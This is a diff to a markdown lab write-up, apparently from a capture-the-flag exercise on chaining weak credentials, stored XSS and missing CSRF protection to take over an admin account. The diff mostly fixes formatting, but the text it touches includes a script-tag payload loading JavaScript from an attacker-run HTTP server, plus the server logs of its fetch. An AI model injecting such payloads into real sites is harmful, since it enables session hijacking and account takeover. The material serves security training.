@@ -188,7 +188,7 @@ MACHINE_IP - - [06/Jul/2025 20:14:05] "GET /script.js HTTP/1.1" 200 -
 - Username: admin<br>
 - Password: **********</p>
 
-<h6 align="center"><img width="500px" src=""https://github.com/user-attachments/assets/0cbf2923-f910-4013-befc-c7263e7d0260"><br></h6>
+<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/123f2665-0f24-4353-a7e9-7ebdb3d8f98e"><br></h6>
 
 <p>All the admin functionality is now available to you, because the application trusts that whoever is logged in with that account has the right to use those features. But you got here not by guessing the admin password, but by chaining smaller issues together: weak credentials, XSS, missing CSRF protection.</p>
 
@@ -232,20 +232,18 @@ fetch('/update_email.php', {
 <p>
   
 - <code>Edit Profile</code><br>
-- <script src="http://xx.xxx.xx.xx:8000/script.js"></script></p>
+- <code><script src="http://xx.xxx.xx.xx:8000/script.js"></script></code></p>
 
 ```bash
 :~/ChainingVulnerabilities# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-
-<h6 align="center"><code>Edit Profile</code><img width="900px" src="https://github.com/user-attachments/assets/a320d80a-389f-4e64-928c-177ae82ea008"><br><br>
+<h6 align="center"><code>Edit Profile</code><br><img width="900px" src="https://github.com/user-attachments/assets/a320d80a-389f-4e64-928c-177ae82ea008"><br><br>
                                             <img width="900px" src="https://github.com/user-attachments/assets/a985d973-6ec7-424b-9ad7-9fdebfc9ee3e"><br><br>
                                             <img width="900px" src="https://github.com/user-attachments/assets/7def0255-c770-48fd-a733-8f8a80b57590"><br><br>
                                             <img width="900px" src="https://github.com/user-attachments/assets/e8bf2d4c-092b-493a-9dfa-a0ebeae18030"><br><br>
-                                            <img width="900px" src="https://github.com/user-attachments/assets/766009c9-2913-463d-a9cd-468cd865a1a6"><br></h6><br>
-
+                                            <img width="900px" src="https://github.com/user-attachments/assets/766009c9-2913-463d-a9cd-468cd865a1a6"><br></h6>
 
 ```bash
 :~/ChainingVulnerabilities# python3 -m http.server
@@ -255,7 +253,7 @@ xx.xxx.xx.xx - - [16/Sep/2025 xx7:xx:xx] "GET /script.js HTTP/1.1" 200 -
 
 <h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/2f8c724c-56cd-402b-801f-1def9ac4fda4"><br><br>
                                             <img width="900px" src="https://github.com/user-attachments/assets/a983934f-4e18-497a-a526-d0db5db70e36"><br><br>
-                                            <img width="900px" src="https://github.com/user-attachments/assets/a549a713-a87a-42a8-9e07-0397f254dbfe"><br></h6><br>
+                                            <img width="900px" src="https://github.com/user-attachments/assets/a549a713-a87a-42a8-9e07-0397f254dbfe"><br></h6>
 
 <p><em>Answer the question below</em></p>
 
